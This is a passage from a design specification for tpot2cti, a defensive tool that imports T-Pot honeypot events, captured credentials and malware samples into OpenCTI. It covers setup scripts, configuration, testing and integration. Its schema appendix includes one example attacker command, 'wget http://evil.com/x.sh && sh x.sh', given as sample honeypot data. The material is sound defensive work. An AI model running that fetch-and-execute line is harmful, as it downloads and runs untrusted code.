    sensor       VARCHAR,
    src_ip       VARCHAR,
    first_seen   TIMESTAMP,
    last_seen    TIMESTAMP,
    attempt_count BIGINT,
    PRIMARY KEY (username, password, sensor, src_ip)
);

CREATE TABLE cycle_log (
    cycle_started_at TIMESTAMP,
    cycle_ended_at   TIMESTAMP,
    events_processed BIGINT,
    creds_new        BIGINT,
    creds_updated    BIGINT
);
```

**Output:** nothing emitted to OpenCTI. The DuckDB file is the
artifact. Users query it via `duckdb` CLI, Python notebook, etc.

**No coordination with core importer:** both connectors read the
same ES independently. They don't share state. Either can be
restarted without affecting the other.

### 8.2 tpot2cti-vault

**Purpose:** SFTP-fetch captured malware sample bytes into a local
content-addressable store. Required by future enrichment connectors
that need the actual bytes (TLSH fuzzy matching, sandbox submission, etc.).

**Activation:** docker-compose profile `vault`.

**Behavior:** runs on its own cycle (default `PT15M`). Connects via
the SSH tunnel to T-Pot and SFTPs files from honeypot drop directories:
- `/data/cowrie/downloads/`
- `/data/dionaea/binaries/`
- `/data/honeytrap/downloads-all/`
- `/data/adbhoney/downloads/`

Stores files at `data/malware-vault/samples/<sha256>` (content-addressable —
duplicate captures deduplicated automatically).

Maintains a state DB at `data/malware-vault/vault_state.db`:

```sql
CREATE TABLE samples (
    sha256          TEXT PRIMARY KEY,
    first_seen_at   TIMESTAMP,
    last_seen_at    TIMESTAMP,
    capture_count   INTEGER,
    first_sensor    TEXT,
    first_honeypot  TEXT,
    size_bytes      INTEGER,
    file_type       TEXT
);

CREATE TABLE seen_files (
    sensor          TEXT,
    honeypot        TEXT,
    filename        TEXT,
    sha256          TEXT,
    seen_at         TIMESTAMP,
    PRIMARY KEY (sensor, honeypot, filename)
);
```

**Output:** files on disk. No OpenCTI emission.

**No coordination with core importer:** the core importer emits
`StixFile` observables based on hashes mentioned in T-Pot events;
the vault connector independently fetches the bytes. They don't
share state. The bytes-on-disk become useful when future enrichment
connectors layer in.

---

## 9. Setup experience

The single command for a new user:

```bash
$ git clone https://github.com/<owner>/tpot2cti.git
$ cd tpot2cti
$ ./setup.sh
```

### Detailed step sequence

1. **Prerequisite checks**
   - Docker Engine 24+ with compose plugin
   - `git` installed
   - RAM ≥ 16 GB (warn if exactly 16; recommend 32)
   - Free disk ≥ 100 GB
   - Outbound TCP to `TPOT_HOST:TPOT_SSH_PORT` reachable (deferred until §6 below)

2. **Interactive prompts**
   - T-Pot connection: `TPOT_HOST`, `TPOT_SSH_USER` (default `tpot`), `TPOT_SSH_PORT` (default `64295`)
   - Operator identity: `OPERATOR_ORG_NAME`, `TPOT2CTI_DEFAULT_TLP`
   - Optional features: enable `credentials`? enable `vault`?

3. **Clone OpenCTI's upstream repo**
   - `git clone https://github.com/OpenCTI-Platform/docker.git opencti`
   - `cd opencti && git checkout $OPENCTI_VERSION` (tag pinned in setup.sh)
   - Verify `opencti/.env.sample` and `opencti/docker-compose.yml` exist

4. **Generate all secrets (one set, shared between both stacks)**
   - `OPENCTI_ADMIN_PASSWORD` (24-char random)
   - `OPENCTI_ADMIN_TOKEN` (UUIDv4)
   - `RABBITMQ_DEFAULT_USER` / `_PASS`
   - `MINIO_ROOT_USER` / `_PASSWORD`
   - `REDIS_PASSWORD`
   - `ELASTIC_PASSWORD`
   - Tuning: `ELASTIC_MEMORY_SIZE` auto-set from detected host RAM (`2g` on 16 GB, `4g` on 32+ GB)
   - All built-in OpenCTI connector UUIDs (read needed list from upstream's `.env.sample`)
   - tpot2cti connector UUIDs (one per connector — core, credentials, vault, reserved)

5. **Populate both .env files**
   - `opencti/.env` ← write from `opencti/.env.sample`, substituting placeholders with the generated secrets
   - `tpot2cti/.env` ← write from our `.env.example`, using the SAME `OPENCTI_ADMIN_TOKEN` value plus our project-specific vars

6. **Generate SSH key for T-Pot tunnel**
   - `ssh-keygen -t ed25519 -f ssh-keys/id_ed25519 -N "" -C "tpot2cti@$(hostname)"`
   - Print public key to console
   - **Pause for user action**: "Add this key to your T-Pot's `authorized_keys` (port 64295), then press Enter"

7. **Test the SSH tunnel**
   - Open a one-shot tunnel: `ssh -o StrictHostKeyChecking=accept-new ... -L 19298:127.0.0.1:64298 ... 'sleep 5'`
   - From host: `curl http://localhost:19298/_cat/indices?h=index | head -1`
   - Verify at least one `logstash-*` index exists
   - Tear down the test tunnel
   - On failure: abort with a clear error pointing to common causes (key not added, wrong host, port blocked)

8. **Start the OpenCTI stack** (this is the long step, ~3-5 minutes)
   - `cd opencti && docker compose -p opencti up -d`
   - Poll `docker compose -p opencti ps` until all containers report healthy
   - Specific health gate: `curl -f http://localhost:8080/health` returns 200
   - Verify the network exists: `docker network inspect opencti_default`
   - On failure: leave OpenCTI containers running, print diagnostic info, abort

9. **Start the tpot2cti stack**
   - `cd tpot2cti && docker compose -p tpot2cti up -d`
   - With `COMPOSE_PROFILES` set from .env to enable any opt-in services
   - Poll until tpot2cti container is healthy

10. **Final verification**
    - `curl -f http://localhost:8080` (OpenCTI reachable)
    - Print success banner with OpenCTI URL + admin credentials
    - Print estimated first-cycle ETA (≤ 15 min)

### Total target time

From `git clone` to live OpenCTI with the first ingestion cycle queued:
**under 10 minutes** on a clean Ubuntu 24.04 host with broadband. The
"long" step (step 8) is OpenCTI's own startup time, which is largely
out of our control.

### Sample success output

```
═══════════════════════════════════════════════════════════
  ✓ Setup complete!

  OpenCTI:    http://localhost:8080
  Username:   admin@opencti.io
  Password:   saved in opencti/.env as OPENCTI_ADMIN_PASSWORD
              (also OPENCTI_ADMIN_TOKEN if you need API access)

  First T-Pot ingestion cycle starts within 15 minutes.

  Stop:       ./teardown.sh
  Update:     ./update.sh
  Logs:       docker compose -p tpot2cti logs -f tpot2cti
  OpenCTI:    docker compose -p opencti logs -f opencti
═══════════════════════════════════════════════════════════
```

### Sister scripts: teardown.sh and update.sh

Both stacks are managed by simple wrapper scripts that hide the
two-project complexity from the user:

```
./teardown.sh           # Stops both stacks; KEEPS data
./teardown.sh --purge   # Stops + removes all data (interactive confirm)
./update.sh             # Pulls latest tpot2cti, rebuilds, restarts our stack
./update.sh --opencti   # Also bumps OpenCTI to the new pinned version
```

---

## 10. Configuration reference

There are **two `.env` files** after setup, one per compose project:

| File | Owned by | Purpose |
|---|---|---|
| `opencti/.env` | OpenCTI's upstream repo | Configures the OpenCTI stack; populated by `setup.sh` from their `.env.sample` |
| `tpot2cti/.env` | Our repo | Configures our connectors; lists vars we own, shares a few keys with OpenCTI's |

The two files are kept in sync by `setup.sh` for shared values (notably
`OPENCTI_ADMIN_TOKEN` which both stacks must agree on). If the user
ever rotates a shared secret manually, they must update both files.
The tpot2cti core importer detects token mismatch on startup and refuses
to run with a clear error.

### `tpot2cti/.env` — our variables

```bash
# === Required ===
TPOT_HOST=                        # T-Pot hostname or IP
TPOT_SSH_USER=tpot                # SSH user on T-Pot
TPOT_SSH_PORT=64295               # T-Pot's SSH port

# === Shared with opencti/.env (setup.sh keeps them aligned) ===
OPENCTI_URL=http://opencti:8080   # internal Docker network address
OPENCTI_ADMIN_TOKEN=              # MUST match opencti/.env

# === Operator identity ===
OPERATOR_ORG_NAME=T-Pot Operator  # appears as STIX Identity name
TPOT2CTI_DEFAULT_TLP=AMBER+STRICT
TPOT2CTI_DEFAULT_CONFIDENCE=75

# === Cycle ===
TPOT2CTI_INTERVAL=PT15M           # cycle interval (ISO 8601 duration)
TPOT2CTI_INITIAL_LOOKBACK_HOURS=0 # 0 = no backfill; positive = hours back
TPOT2CTI_INDEXING_DELAY_SECONDS=30  # between bundle passes

# === Honeypot type filtering (optional) ===
TPOT2CTI_IGNORE_TYPES=            # comma-separated; default empty
                                  # e.g. "P0f,Tanner" to skip those

# === Compose profiles (optional features) ===
COMPOSE_PROFILES=                 # comma-separated; "credentials", "vault"
                                  # set by setup.sh

# === Connector UUIDs (generated by setup.sh; pinned across restarts) ===
TPOT2CTI_CONNECTOR_ID=
TPOT2CTI_CREDENTIALS_CONNECTOR_ID=
TPOT2CTI_VAULT_CONNECTOR_ID=

# === Network attachment (rarely changed) ===
OPENCTI_NETWORK_NAME=opencti_default  # external network created by OpenCTI's compose

# === Logging ===
LOG_LEVEL=INFO                    # DEBUG, INFO, WARNING, ERROR
```

### `opencti/.env` — owned by upstream

This file is **OpenCTI's**, generated from their `.env.sample`. We
write secrets into it from `setup.sh` but otherwise treat it as a
black box. Documentation of its vars lives at
[OpenCTI's docker repo](https://github.com/OpenCTI-Platform/docker).

Variables `setup.sh` populates:

```bash
OPENCTI_ADMIN_EMAIL=admin@opencti.io
OPENCTI_ADMIN_PASSWORD=<generated>
OPENCTI_ADMIN_TOKEN=<generated UUID>      # mirrored in tpot2cti/.env

RABBITMQ_DEFAULT_USER=<generated>
RABBITMQ_DEFAULT_PASS=<generated>

MINIO_ROOT_USER=<generated>
MINIO_ROOT_PASSWORD=<generated>

ELASTIC_MEMORY_SIZE=2G            # auto-tuned to host RAM
ELASTIC_PASSWORD=<generated>

CONNECTOR_HISTORY_ID=<generated UUID>
CONNECTOR_EXPORT_FILE_STIX_ID=<generated UUID>
CONNECTOR_EXPORT_FILE_CSV_ID=<generated UUID>
CONNECTOR_EXPORT_FILE_TXT_ID=<generated UUID>
CONNECTOR_IMPORT_FILE_STIX_ID=<generated UUID>
CONNECTOR_IMPORT_DOCUMENT_ID=<generated UUID>
CONNECTOR_ANALYSIS_ID=<generated UUID>
CONNECTOR_IMPORT_EXTERNAL_REFERENCE_ID=<generated UUID>
# ... whatever else upstream requires; setup.sh iterates the
#     .env.sample's CHANGEME placeholders and fills them all
```

If upstream adds new required variables, `setup.sh` detects them
(they have `CHANGEME` placeholder in `.env.sample`) and either auto-
generates if it knows the shape (UUID, password) or prompts the user.

### Optional `config/tpot2cti.yaml`

Advanced users can override per-parser behavior:

```yaml
parsers:
  # Suppress entire honeypot types
  ignore_types: ["P0f", "Tanner"]

  # Per-parser overrides
  cowrie:
    emit_user_account: false        # default false; experimental
    extract_urls_from_commands: true
    substance_threshold: 1          # min commands or files for full SDO emission

  suricata:
    severity_threshold: 0           # 0 = all; 3 = only severity ≥ 3

  honeytrap:
    payload_size_threshold: 8       # bytes; below this = Sighting only
```

`config/tpot2cti.yaml` is optional; sensible defaults if absent.

### Optional `config/tpot2cti.yaml`

Advanced users can override per-parser behavior:

```yaml
parsers:
  # Suppress entire honeypot types
  ignore_types: ["P0f", "Tanner"]

  # Per-parser overrides
  cowrie:
    emit_user_account: false        # default false; experimental
    extract_urls_from_commands: true
    substance_threshold: 1          # min commands or files for full SDO emission

  suricata:
    severity_threshold: 0           # 0 = all; 3 = only severity ≥ 3

  honeytrap:
    payload_size_threshold: 8       # bytes; below this = Sighting only
```

`config/tpot2cti.yaml` is optional; sensible defaults if absent.

---

## 11. Deployment requirements

### Minimum

- **CPU:** 4 cores
- **RAM:** 16 GB
- **Disk:** 128 GB (allocate at least 100 GB for OpenCTI ES)
- **OS:** Ubuntu 22.04 LTS or 24.04 LTS (others likely work but
  untested in v1.0)
- **Docker:** Engine 24+ with Compose plugin
- **Network:** Outbound SSH to T-Pot's `:64295`
- **T-Pot version:** 24.04.x

### Recommended

- **CPU:** 4-8 cores
- **RAM:** 32 GB
- **Disk:** 256 GB+ (gives room for longer ES retention)

### Tuning notes

We do **not** modify OpenCTI's compose file. Their defaults are used
verbatim. Where their `.env.sample` exposes a tunable knob, `setup.sh`
adjusts it for the host's available resources:

| OpenCTI env var | tpot2cti behavior |
|---|---|
| `ELASTIC_MEMORY_SIZE` | Auto-set: `2G` on 16 GB hosts, `4G` on 32+ GB |

Other resource limits (Redis, RabbitMQ, MinIO) use OpenCTI's defaults.
If a user is resource-constrained, they can manually edit
`opencti/docker-compose.yml` — but they're now editing upstream code,
not ours, and any future `git pull` in `opencti/` will overwrite their
changes (or merge-conflict). We document this trade-off but do not
provide a tooling layer to manage it.

---

## 12. Compatibility matrix

| tpot2cti version | T-Pot version | OpenCTI version | Notes |
|---|---|---|---|
| **1.0.x** | 24.04.x | 6.x.y (pinned in compose) | First stable release |

Breaking compatibility (new T-Pot major or new OpenCTI major) triggers
a minor version bump and a documented migration path. Schema-incompatible
T-Pot changes (which have happened in past releases) are caught by the
fallback parser — events keep flowing, even if details degrade until a
parser update lands.

---

## 13. Testing strategy

### Unit tests (per parser)

Each parser ships with `tests/test_<parser>.py` that:
- Loads a captured T-Pot ES doc fixture (real example, sanitized)
- Calls `parser.parse(doc)`
- Asserts the expected list of SDOs and relationships emitted

Test fixtures live at `tests/fixtures/<honeypot>/*.json`.

### Integration test

Single integration test in `tests/integration/`:
- Spins up a mock ES populated with synthetic T-Pot docs (covering
  all 21+ types)
- Runs the importer for one cycle
- Asserts OpenCTI receives the expected counts

Can be run via `make test` and as part of CI.

### Smoke tests in setup.sh

The `setup.sh` script's "test tunnel" step is itself a smoke test:
- Verifies SSH connectivity
- Verifies ES is reachable through the tunnel
- Verifies `logstash-*` indices exist
- Verifies at least one recent doc is queryable

If any of those fail, setup aborts with a clear message rather than
bringing up a stack that won't have data.

### Manual verification post-deploy

The README walks the user through:
1. Open OpenCTI at `http://localhost:8080`
2. Login
3. Wait 15-20 minutes for the first cycle
4. Navigate to **Observations → Observables**
5. Confirm IPv4 observables are appearing
6. Click one — see Location, Sightings, related Indicators

---

## 14. Contribution guide (for future contributors)

This is the abridged version; full version lives in
`docs/CONTRIBUTING.md` once code exists.

### Adding a new parser

1. Create `tpot2cti/src/parsers/<honeypot>.py` inheriting from `BaseParser`
2. Implement `type_name = "<T-Pot type value>"`
3. Implement `parse(doc) -> ParsedEvent`
4. Add a test fixture at `tests/fixtures/<honeypot>/example.json`
5. Add `tests/test_<honeypot>.py`
6. Register the parser in `tpot2cti/src/parsers/__init__.py`
7. Document in `docs/PARSERS.md`

### Adding a new STIX type emission

1. Add to the `STIX object inventory` table in this spec doc
2. Add deterministic ID seed pattern to `tpot2cti/src/stix/ids.py`
3. Add the builder factory to `tpot2cti/src/stix/builder.py`
4. Document any new relationships in the architecture diagram

### What NOT to add to core

The following are out of scope for the core tpot2cti importer:
- Threat-intel enrichment (separate connector pattern)
- LLM / behavioral analysis (separate connector)
- Malware classification (separate connector)
- Alerting / paging (use OpenCTI's built-in playbooks)
- Export to external feeds (separate connector)

If you have a feature in one of these categories, propose it as a
separate companion connector (`tpot2cti-<feature>`) following the
same architectural pattern (read T-Pot ES via the same tunnel, write
to OpenCTI or a local file/DB).

---

## 15. v1.0 acceptance criteria

These are the ship gates. v1.0 is not released until all are met:

### Functional

- [ ] All 21+ specified parsers implemented + tested
- [ ] Fallback parser handles any unrecognized `type` value
- [ ] All STIX SDOs and relationships per §4 emitted correctly
- [ ] Deterministic IDs across restarts (idempotent re-emission)
- [ ] Three-pass bundle send with configurable indexing delay
- [ ] No backfill by default; opt-in via env var
- [ ] Daily top-100 credentials Note emitted correctly

### Optional connectors

- [ ] `tpot2cti-credentials` works end-to-end (DuckDB populated)
- [ ] `tpot2cti-vault` fetches samples via SFTP, dedups by SHA-256
- [ ] Both can be enabled/disabled via compose profiles + .env

### Setup experience

- [ ] `setup.sh` succeeds on fresh Ubuntu 24.04 in under 10 minutes
- [ ] Setup clones the pinned OpenCTI tag from `OpenCTI-Platform/docker`
- [ ] Setup populates `opencti/.env` from upstream's `.env.sample`
      (does NOT use a vendored copy)
- [ ] Setup detects all `CHANGEME` placeholders in upstream's .env.sample
      and fills them (logs a warning for any it can't auto-handle)
- [ ] Setup brings OpenCTI up FIRST, waits for health, then brings up
      tpot2cti
- [ ] Setup includes tunnel smoke test before bringing up either stack
- [ ] Secrets are randomly generated, never default
- [ ] `OPENCTI_ADMIN_TOKEN` is identical in both `.env` files
- [ ] Public key clearly displayed for user to add to T-Pot
- [ ] `teardown.sh` and `update.sh` both work and are documented

### Operational

- [ ] Cycle audit log written to `data/cycles.jsonl`
- [ ] Health endpoint responds on internal `:8080/health`
- [ ] Logs rotated daily, 30-day retention
- [ ] Graceful shutdown on SIGTERM
- [ ] Container restart policy ensures recovery from crashes

### Documentation

- [ ] `README.md` with screenshot + 1-paragraph "what it does"
- [ ] `docs/SETUP.md` — step-by-step install
- [ ] `docs/SSH_TUNNEL.md` — tunnel configuration + troubleshooting
- [ ] `docs/ARCHITECTURE.md` — diagrams + STIX object model
- [ ] `docs/PARSERS.md` — what each parser produces
- [ ] `docs/CONTRIBUTING.md` — how to add a parser, run tests, submit PR
- [ ] `docs/COMPATIBILITY.md` — T-Pot version + OpenCTI version notes
- [ ] `docs/TROUBLESHOOTING.md` — common errors + fixes

### Quality

- [ ] CI runs unit tests + lint on every PR
- [ ] No `WARNING` or `ERROR` log lines in a clean steady-state cycle
- [ ] Memory usage stable over 24h (no leaks)
- [ ] LICENSE file present (AGPLv3)
- [ ] CHANGELOG.md present

### Validation

- [ ] Tested against a live T-Pot 24.04 deployment for at least 7 days
  of continuous operation
- [ ] At least 3 independent contributors have run setup.sh successfully
  on their own infrastructure
- [ ] OpenCTI graph "feels right" — analyst can pivot from IP to
  Sightings to related Files in under 5 clicks

---

## 16. Post-v1.0 roadmap (informational)

This section is forward-looking and NOT part of v1.0 scope. It lists
companion connectors that could plug into the same architecture later.
Each would be its own optional connector following the pattern.

| Future connector | Purpose | Free? | Key required? |
|---|---|---|---|
| `tpot2cti-maxmind` | GeoIP enrichment (richer than T-Pot's built-in) | Yes | No (just download) |
| `tpot2cti-malwarebazaar` | Malware family attribution (local CSV mirror + TLSH fuzzy) | Yes | No |
| `tpot2cti-firehol` | IP reputation against 14 blocklists | Yes | No |
| `tpot2cti-abuseipdb` | AbuseIPDB lookup | Yes (1k/day free) | Yes |
| `tpot2cti-otx` | AlienVault OTX pulses | Yes | Yes |
| `tpot2cti-misp` | Bidirectional MISP bridge | Yes | No (own MISP instance) |
| `tpot2cti-discord` | Daily summary webhook to Discord | Yes | No |
| `tpot2cti-mitreattack` | Auto-import MITRE ATT&CK STIX feed | Yes | No |

Each plug-in:
- Shares the existing SSH tunnel where applicable
- Writes to OpenCTI via the same pycti pattern
- Has its own optional compose profile
- Lives in its own subdirectory of the repo (or its own repo)
- Documented as a separate concern

---

## 17. Out-of-scope items (explicit list)

To prevent scope creep, the following are out of scope for v1.0 AND
should not be added without a clear architectural justification:

- Forking, vendoring, or repackaging OpenCTI's compose, .env.sample, or any other upstream artifacts
- Shipping pre-tuned OpenCTI configuration that diverges from upstream defaults (we only set values via env vars, never edit their compose)
- Maintaining a vendored copy of OpenCTI's `.env.sample` (we always read it fresh from the cloned upstream repo)
- Persona-specific behaviors (sensor customization detection, persona-derived credential matching, persona-targeted attack flagging)
- LLM-based analysis
- Sandbox classification (GTI Sandbox, Hatching Triage, CrowdStrike, etc.)
- Multi-tenant / multi-T-Pot in a single deployment (use multiple separate deployments instead)
- Sensor management or T-Pot configuration
- Active responses or attacker engagement (the project is read-only on T-Pot)
- Sharing data anywhere except OpenCTI by default (user can use OpenCTI's own export features)
- A web UI other than OpenCTI's
- Mobile app
- Real-time streaming (the 15-min batch cadence is intentional)
- Pre-built Docker images on a registry (build-from-source for v1.0; pre-built images possible for v1.1)
- Kubernetes deployment (docker-compose is the only supported mode for v1.0)

---

## 18. Open questions

These are decisions deferred to the implementation phase or to a
post-v1.0 discussion:

1. **Repo location.** GitHub under personal account or under a project
   organization? Affects discoverability.
2. **GitHub Actions for CI.** What runners, what tests, what release
   automation? Lean toward minimal (lint + unit tests) for v1.0.
3. **Pre-built Docker images.** Docker Hub or GHCR for v1.1+. Not v1.0.
4. **Versioned `config/tpot2cti.yaml` migration.** What happens when a
   future version changes the config schema? Probably document a
   migration in each release notes.
5. **Specific OpenCTI version to pin for v1.0.** Need to identify the
   latest stable 6.x release at ship time and run full integration tests
   against it. Document the chosen version in `setup.sh` and
   `docs/COMPATIBILITY.md`. Bumping is a deliberate maintainer action
   per §19.5.
6. **Persona-D / sensor-customization signaling.** If a user's T-Pot
   has custom honeypots not in T-Pot's standard build, do their events
   land in `logstash-*` with `type` values we don't recognize? Probably
   yes → fallback parser handles. Worth verifying in testing.
7. **Existing-OpenCTI detection logic.** §19.7 describes the choice
   offered to users who already have OpenCTI running. Implementation
   detail: how does `setup.sh` detect existing OpenCTI? Check
   `localhost:8080`? Check for `opencti/` directory? Check Docker for
   a running `opencti` container? Probably all three with sensible
   precedence.
8. **OpenCTI's built-in connectors that ship in their default compose.**
   They include connectors like `connector-history`, `connector-export-file-stix`,
   etc. Do any of them conflict with or duplicate functionality from
   our connectors? Likely no — they're orthogonal — but worth verifying
   in testing.

---

## 19. OpenCTI integration details

This section documents the integration contract between tpot2cti and
the upstream OpenCTI install. It exists because the two-stack
architecture has several non-obvious coordination points.

### 19.1 Network attachment

OpenCTI's compose creates a Docker network when it runs. With our
recommended command (`docker compose -p opencti up -d`), the network
is named `opencti_default`.

Our compose references this as external:

```yaml
networks:
  opencti_net:
    external: true
    name: ${OPENCTI_NETWORK_NAME:-opencti_default}
```

`OPENCTI_NETWORK_NAME` is overridable in `tpot2cti/.env` for users
who deploy OpenCTI with a non-default project name. `setup.sh`
detects the network name during step 8 of setup and writes it into
`.env` accordingly.

If we ever start tpot2cti before OpenCTI has created the network,
Docker errors out with `network opencti_default not found`. The
`depends_on` field in our compose doesn't cover external networks —
this is enforced by `setup.sh`'s startup ordering.

### 19.2 Service-name resolution

On the shared `opencti_default` network, OpenCTI's compose-defined
service names are resolvable. We use them in our env vars:

| Service we talk to | Address |
|---|---|
| OpenCTI API | `http://opencti:8080` |
| RabbitMQ (used internally by pycti) | `amqp://rabbitmq:5672` |
| (Redis, MinIO, ES — not directly accessed by us) | n/a |

If upstream renames any of these services in their compose, our env
vars need updating. The integration test (§13) verifies these
service names resolve at the start of every CI run.

### 19.3 Admin token coordination

The `OPENCTI_ADMIN_TOKEN` value MUST be identical in both `.env`
files. `setup.sh` enforces this on first install. After install:

- If the user rotates the token in `opencti/.env`, OpenCTI uses the
  new value at next restart. Our connectors continue using the old
  value from `tpot2cti/.env` and start failing with 401 Unauthorized.
- The tpot2cti core importer's startup check tests authentication
  against `OPENCTI_URL` using the configured token. On failure it logs
  a specific error: "Token mismatch — verify `OPENCTI_ADMIN_TOKEN` in
  tpot2cti/.env matches opencti/.env" and exits non-zero.
- `update.sh` re-checks the token alignment and prompts to fix on
  mismatch.

### 19.4 Connector registration

OpenCTI requires each external connector to register itself with a
**stable UUID** on first contact. We generate these UUIDs in
`setup.sh` and write them to `tpot2cti/.env`:

```
TPOT2CTI_CONNECTOR_ID=<uuid4>
TPOT2CTI_CREDENTIALS_CONNECTOR_ID=<uuid4>
TPOT2CTI_VAULT_CONNECTOR_ID=<uuid4>
```

Each connector's container reads its assigned UUID at startup and
registers with OpenCTI's RabbitMQ via pycti. The UUID is the
connector's identity for that OpenCTI instance — it must not change
between restarts or OpenCTI sees it as a new connector.

If a user accidentally deletes their `.env` and re-runs `setup.sh`,
new UUIDs are generated and the old connector registrations become
orphaned in OpenCTI (visible in the OpenCTI UI under "Data → Connectors"
as "in error" state). The user can clean them up manually from the
OpenCTI UI. This is rare and not worth automating in v1.0.

### 19.5 Upstream version pinning policy

`setup.sh` contains:

```bash
OPENCTI_VERSION=v6.x.y           # the tag we test against
```

Every tpot2cti release tests against exactly one OpenCTI version. The
combination is documented in `docs/COMPATIBILITY.md`. Bumping
OpenCTI's pinned version is a deliberate maintainer action that
includes:

1. Verify the .env.sample shape hasn't broken our placeholder-filling logic
2. Verify our compose's external network reference still resolves
3. Verify all our STIX emissions still work against the new version's
   schema validators (OpenCTI occasionally tightens what they accept)
4. Verify the OpenCTI UI still renders our entities correctly
5. Run the integration test suite end-to-end
6. Update `docs/COMPATIBILITY.md` with the new combination
7. Tag a new tpot2cti release

We do NOT auto-bump OpenCTI. Users get the version we tested. If they
want a newer one, they edit `OPENCTI_VERSION` themselves and accept the
risk (we'll help on best-effort).

### 19.6 OpenCTI breaking-change handling

When OpenCTI introduces a breaking change between releases:

| Type of change | Our response |
|---|---|
| `.env.sample` adds a new required CHANGEME placeholder | `setup.sh` detects unfilled placeholders → auto-generates if known shape (UUID, password) or prompts user. Fix is shipped same release. |
| `.env.sample` removes a var we were filling | Harmless — we'd just write a value that's no longer read. Fix in next release to stop writing it. |
| Service name change in their compose (e.g. `opencti` → `opencti-platform`) | Our compose env var `OPENCTI_URL` breaks. setup.sh diff detection catches it; we ship a release with the new service name. |
| Network name change | Caught by `setup.sh`'s network detection step. Update `OPENCTI_NETWORK_NAME` env in .env. |
| STIX schema validation tightening | Our STIX builder needs updating. Pre-release tests catch this. |
| pycti API changes | We pin our pycti version in `requirements.txt` to match the OpenCTI version we test against. Bumping OpenCTI version implies bumping pycti. |

The risk surface is real but manageable because we're aligned with
one OpenCTI version per release. Users always know what they're getting.

### 19.7 What if a user already has OpenCTI?

A meaningful subset of community users already have OpenCTI running
from prior projects. Our `setup.sh` should detect this and offer a
choice:

```
▸ Existing OpenCTI detected at ./opencti or http://localhost:8080.

  Options:
    [1] Use this existing OpenCTI install (skip the clone step)
    [2] Install fresh OpenCTI alongside (using our pinned version)
    [3] Abort
```

Path [1] requires the user to provide their existing `OPENCTI_URL`,
`OPENCTI_ADMIN_TOKEN`, and `OPENCTI_NETWORK_NAME`. Documented but
labeled as "advanced — version compatibility not guaranteed."

Path [2] is the default — we install our own OpenCTI alongside theirs,
on a different docker-compose project name (e.g. `opencti-tpot2cti`).
Two OpenCTI instances on one host, slightly more resource cost, clean
separation.

For v1.0, we'd ship path [2] as default and document path [1] as a
manual procedure (no setup-script automation for path [1] in v1.0).

---

## Appendix A: T-Pot ES schema reference

Documenting the T-Pot 24.04 doc shape so parsers have a clear contract.

### Common fields (present on all docs)

```json
{
  "@timestamp": "ISO8601",
  "type": "Cowrie | Suricata | ConPot | ...",
  "src_ip": "1.2.3.4",
  "src_port": 12345,
  "dest_ip": "10.0.0.1",
  "dest_port": 22,
  "t-pot_hostname": "tpot01",
  "t-pot_ip_ext": "5.6.7.8",
  "geoip": {
    "country_iso_code": "RU",
    "country_name": "Russia",
    "city_name": "Moscow",
    "asn": 12345,
    "as_org": "Some ISP",
    "location": { "lat": 55.7558, "lon": 37.6173 }
  }
}
```

### Cowrie-specific fields

```json
{
  "type": "Cowrie",
  "eventid": "cowrie.session.connect | cowrie.login.failed | ...",
  "session": "abc123",
  "username": "root",
  "password": "123456",
  "input": "wget http://evil.com/x.sh && sh x.sh",
  "shasum": "abc123...",
  "url": "http://evil.com/x.sh",
  "version": "SSH-2.0-libssh_0.9.6",
  "hassh": "fingerprint-hash",
  "kex_algs": ["curve25519-sha256", ...]
}
```

### Suricata-specific fields

```json
{
  "type": "Suricata",
  "alert": {
    "signature": "ET SCADA Modbus invalid Length",
    "signature_id": 12345,
    "category": "Generic Protocol Command Decode",
    "severity": 3,
    "metadata": {
      "mitre_attack_id": ["T1190"],
      "mitre_technique_id": ["T1190"]
    }
  },
  "flow_id": 7890,
  "proto": "TCP",
  "http": { ... },
  "tls": { ... }
}
```

(Detailed per-honeypot schemas captured in tests/fixtures/ during
implementation.)

---

*End of spec.*
